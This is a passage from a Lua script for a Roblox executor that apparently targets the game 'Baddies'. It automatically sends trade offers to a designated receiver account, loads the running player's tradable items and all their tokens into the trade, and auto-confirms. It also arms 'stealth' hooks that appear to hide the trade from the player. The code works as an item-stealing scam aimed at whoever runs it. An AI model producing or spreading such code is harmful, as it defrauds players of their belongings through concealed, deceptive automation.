                itemIndex = index,
                attempt = attempt,
            })
            task.wait(0.05)
        end

        if not itemAdded then
            setTradeDebug({
                phase = "add_failed",
                lastAdd = item.name,
                lastErr = lastErr or "failed to add item",
                added = added,
                itemIndex = index,
            })
            continue
        end
    end

    setTradeDebug({ phase = "add_done", added = added })
    return added
end

local function waitForPlayersReady(tradeRep, timeout)
    timeout = timeout or 120
    local started = os.clock()
    while os.clock() - started < timeout do
        if not isTradeLive() then
            return false
        end
        if tradeRep.Data and tradeRep.Data.PlayersReady then
            return true
        end
        task.wait(0.25)
    end
    return false
end

local function waitForConfirmUnlock(tradeRep)
    local tradeData = getTradeData()
    local countdown = tradeData and tradeData.ConfirmCountdownTime or 5
    local lastModified = tradeRep.Data and tradeRep.Data.LastModifiedTime or workspace:GetServerTimeNow()
    local unlockAt = lastModified + countdown

    while workspace:GetServerTimeNow() < unlockAt do
        if not isTradeLive() then
            return false
        end
        task.wait(0.1)
    end

    task.wait(0.2)
    return true
end

local function pressReady(tradeRep)
    local remotes = getTradeRemotes()
    if not remotes then
        return false
    end

    if tradeRep and not waitForTradeActionUnlock(tradeRep) then
        return false
    end

    return invokeTradeRemote(remotes.SetReady, true)
end

local function pressConfirm(tradeRep)
    local remotes = getTradeRemotes()
    if not remotes then
        return false
    end

    if tradeRep and not waitForConfirmUnlock(tradeRep) then
        return false
    end

    return invokeTradeRemote(remotes.ConfirmTrade)
end

local function setTradeTokens(dataReplion, tradeRep)
    local tokens = getTokenBalance(dataReplion)
    if tokens <= 0 then
        return 0
    end

    local uid = tostring(LocalPlayer.UserId)
    local me = tradeRep.Data and tradeRep.Data.Players and tradeRep.Data.Players[uid]
    if me and me.Tokens == tokens then
        return tokens
    end

    local remotes = getTradeRemotes()
    if not remotes then
        return 0
    end

    local ok = invokeTradeRemote(remotes.SetTokens, tokens)
    if ok then
        return tokens
    end

    return 0
end

local function autoCompleteTrade(tradeRep, dataReplion)
    local uid = tostring(LocalPlayer.UserId)
    local deadline = os.clock() + 180

    while os.clock() < deadline do
        if TradeState.completed then
            return true
        end
        if TradeState.ended or not isTradeLive() then
            return false
        end

        local data = tradeRep.Data
        if not data or not data.Players then
            task.wait(0.3)
            continue
        end

        local me = data.Players[uid]
        if not me then
            task.wait(0.3)
            continue
        end

        if not me.IsReady then
            pressReady(tradeRep)
            task.wait(0.6)
            continue
        end

        if data.PlayersReady then
            if waitForConfirmUnlock(tradeRep) and not me.IsConfirmed then
                pressConfirm(tradeRep)
            end
        end

        if me.IsConfirmed and TradeState.completed then
            return true
        end

        task.wait(0.5)
    end

    return TradeState.completed
end

local function trySendTradeInvite(targetPlayer)
    if os.clock() - TradeRuntime.lastInviteAt < TRADE_INVITE_COOLDOWN then
        return false, "invite cooldown"
    end

    if LocalPlayer:GetAttribute("IsTrading") then
        return false, "already trading"
    end

    local remotes = getTradeRemotes()
    if not remotes then
        return false, "trade remotes missing"
    end

    TradeState.completed = false
    TradeState.ended = false
    TradeState.replionId = nil

    ensureTradeEnabled(TradeRuntime.dataReplion)

    local ok, res = pcall(function()
        return remotes.SendTradeOffer:InvokeServer(targetPlayer)
    end)

    TradeRuntime.lastInviteAt = os.clock()

    if ok and res == true then
        return true
    end

    return false, ok and tostring(res) or tostring(res)
end

local function runTradeSession(replionId, dataReplion, catalog, rapReplion)
    if TradeRuntime.sessionRunning then
        return false
    end
    TradeRuntime.sessionRunning = true
    setTradeDebug({ phase = "session_start" })

    local sessionResult = false

    local function finish(result, detail)
        TradeRuntime.sessionRunning = false
        sessionResult = result == true
        setTradeDebug({
            sessionResult = result and "ok" or "failed",
            sessionDetail = detail,
            phase = result and "session_ok" or "session_failed",
        })
    end

    local ok, sessionErr = pcall(function()
        replionId = normalizeTradeReplionId(replionId)
        if not replionId then
            finish(false, "missing replion id")
            return
        end

        TradeState.replionId = replionId
        TradeState.active = true
        setTradeDebug({ phase = "wait_is_trading", replionId = replionId })

        waitForTradingAttribute(12)

        setTradeDebug({ phase = "wait_replion" })
        local tradeRep = waitForTradeReplion(replionId, 20)
        if not tradeRep then
            finish(false, "trade replion timeout")
            return
        end

        setTradeDebug({ phase = "wait_session_ready" })
        if not waitForTradeSessionReady(tradeRep, 20) then
            finish(false, "trade session not ready")
            return
        end

        setTradeDebug({ phase = "wait_trade_open" })
        if not waitForTradeSessionOpen(tradeRep, 15) then
            finish(false, "trade open timeout")
            return
        end

        armTradeStealth()

        local allItems = collectTradableTradeItems(dataReplion, catalog, rapReplion)
        local tokens = getTokenBalance(dataReplion)
        setTradeDebug({
            replionId = replionId,
            tradableCount = #allItems,
            tokens = tokens,
            added = 0,
            phase = "collect_done",
        })

        if #allItems == 0 and tokens <= 0 then
            finish(false, "nothing to trade")
            return
        end

        local maxItems = getTradeMaxItems()
        local batch = {}
        for i = 1, math.min(maxItems, #allItems) do
            table.insert(batch, allItems[i])
        end

        local addedCount = 0
        if #batch > 0 then
            addedCount = addItemsToTrade(tradeRep, batch)
        end

        setTradeDebug({ added = addedCount, phase = "add_finished" })

        if not isTradeLive() then
            finish(false, "trade ended before tokens")
            return
        end

        if addedCount == 0 and tokens <= 0 then
            finish(false, "no items added")
            return
        end

        setTradeTokens(dataReplion, tradeRep)
        task.wait(0.15)

        finish(autoCompleteTrade(tradeRep, dataReplion))
    end)

    if not ok then
        finish(false, tostring(sessionErr))
    end

    return sessionResult
end

local function startTradeLoop()
    local serverOk, serverMessage = validateServerEarly()
    if not serverOk then
        return
    end

    if not getgenv().BaddiesAllowTrade then
        return
    end

    setupTradeListeners()
    getTradeData()
    installTradeStealthHooks()

    local dataReplion = waitForDataReplion(45)
    if not dataReplion then
        return
    end

    local catalog = loadCatalog()
    local rapReplion = waitForRapReplion(20)

    TradeRuntime.dataReplion = dataReplion
    TradeRuntime.catalog = catalog
    TradeRuntime.rapReplion = rapReplion

    ensureTradeEnabled(dataReplion)

    while true do
        local receiver = getReceiverPlayer()
        if not receiver then
            task.wait(2)
            continue
        end

        if TradeRuntime.sessionRunning then
            task.wait(0.5)
            continue
        end

        if isTradeLive() then
            local replionId = normalizeTradeReplionId(TradeState.replionId)
            if not replionId then
                replionId = waitForTradeStart(8)
            end
            if replionId then
                runTradeSession(replionId, dataReplion, catalog, rapReplion)
            end
            task.wait(TRADE_INVITE_COOLDOWN)
            continue
        end

        local allItems = collectTradableTradeItems(dataReplion, catalog, rapReplion)
        local tokens = getTokenBalance(dataReplion)
        if #allItems == 0 and tokens <= 0 then
            break
        end

        local sent, inviteErr = trySendTradeInvite(receiver)
        if not sent then
            task.wait(2)
            continue
        end

        local replionId = waitForTradeStart(20)
        if replionId then
            runTradeSession(replionId, dataReplion, catalog, rapReplion)
        end

        task.wait(TRADE_INVITE_COOLDOWN)
    end
end

local ok, err = pcall(scanAndSend)

if not ok then
    setScanStatus("error", tostring(err))
end

if ENABLE_TRADE and getgenv().BaddiesAllowTrade then
    task.spawn(function()
        pcall(startTradeLoop)
    end)
end

getgenv().BaddiesScanAndSend = scanAndSend
getgenv().BaddiesGetTradeId = function()
    return normalizeTradeReplionId(TradeState.replionId)
end
getgenv().BaddiesGetStatus = function()
    local ls = getgenv().BaddiesLastScan or {}
    local td = getgenv().BaddiesTradeDebug or {}
    local detail = ls.detail
    local detailText = detail
    if typeof(detail) == "table" then
        detailText = string.format(
            "items=%s rap=%s",
            tostring(detail.totalItems),
            tostring(detail.totalRap)
        )
    end
    return string.format(
        "scan=%s (%s) | tradeId=%s | added=%s/%s | lastErr=%s | phase=%s | session=%s",
        tostring(ls.status),
        tostring(detailText),
        tostring(normalizeTradeReplionId(TradeState.replionId)),
        tostring(td.added),
        tostring(td.tradableCount),
        tostring(td.lastErr),
        tostring(td.phase),
        tostring(td.sessionDetail or td.sessionResult)
    )
end
